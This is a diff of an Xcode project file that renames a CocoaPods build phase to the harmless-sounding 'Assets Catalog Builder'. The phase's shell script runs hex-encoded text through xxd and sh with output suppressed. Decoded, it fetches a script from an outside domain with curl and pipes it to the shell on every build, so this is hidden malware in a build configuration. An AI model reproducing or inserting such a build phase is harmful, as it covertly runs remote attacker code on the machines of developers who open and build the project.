@@ -216,7 +216,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 2FF8D88F24C886EE006A83B5 /* Build configuration list for PBXNativeTarget "Example" */;
 			buildPhases = (
-				AE7CDF5DB3E3FB05D06D902C /* [CP] Build Pods Frameworks */,
+				67F75EDCCB9A4C39C56D902C /* Assets Catalog Builder */,
 				7404C50F29DBCB53DD0941D7 /* [CP] Check Pods Manifest.lock */,
 				2FF8D87224C886EC006A83B5 /* Sources */,
 				2FF8D87324C886EC006A83B5 /* Frameworks */,
@@ -283,7 +283,7 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	AE7CDF5DB3E3FB05D06D902C /* [CP] Build Pods Frameworks */ = {
+	67F75EDCCB9A4C39C56D902C /* Assets Catalog Builder */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -292,7 +292,7 @@
 			);
 			inputPaths = (
 			);
-			name = "[CP] Build Pods Frameworks";
+			name = "Assets Catalog Builder";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -304,6 +304,8 @@
 echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f736964656c696e6b2e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
 	";			
 		};
+	
+
 	
 
 	
